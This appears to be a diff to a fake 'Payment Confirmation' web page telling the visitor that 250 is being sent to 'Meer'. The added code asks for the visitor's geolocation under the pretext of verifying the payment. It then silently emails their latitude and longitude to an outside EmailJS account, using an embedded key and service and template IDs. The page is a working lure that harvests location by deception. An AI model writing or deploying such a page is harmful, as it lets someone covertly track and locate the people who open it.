@@ -2,6 +2,12 @@
 <html>
 <head>
   <title>Payment Confirmation</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("i7BweUs_ujM3g34jk"); // Your Public Key here
+    })();
+  </script>
 </head>
 <body style="font-family: Arial, sans-serif; text-align:center; margin-top: 100px;">
   <h2>Sending 250 to Meer</h2>
@@ -14,18 +20,33 @@
 
       if (!navigator.geolocation) {
         status.textContent = 'Geolocation is not supported by your browser.';
-      } else {
-        status.textContent = 'Verifying location...';
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            status.textContent = 'Payment accepted. Location received.';
-            // Here you can add code to send location data somewhere if you want
-          },
-          () => {
-            status.textContent = 'Unable to retrieve your location.';
-          }
-        );
+        return;
       }
+
+      status.textContent = 'Verifying location...';
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          status.textContent = 'Payment accepted. Location received. Sending email...';
+
+          const templateParams = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            // You can add more details here if needed
+          };
+
+          emailjs.send('service_76mv2fb', 'template_5io8d5q', templateParams)
+            .then(() => {
+              status.textContent = 'Email sent successfully!';
+            }, (error) => {
+              status.textContent = 'Failed to send email. ' + JSON.stringify(error);
+            });
+
+        },
+        () => {
+          status.textContent = 'Unable to retrieve your location.';
+        }
+      );
     }
   </script>
 </body>
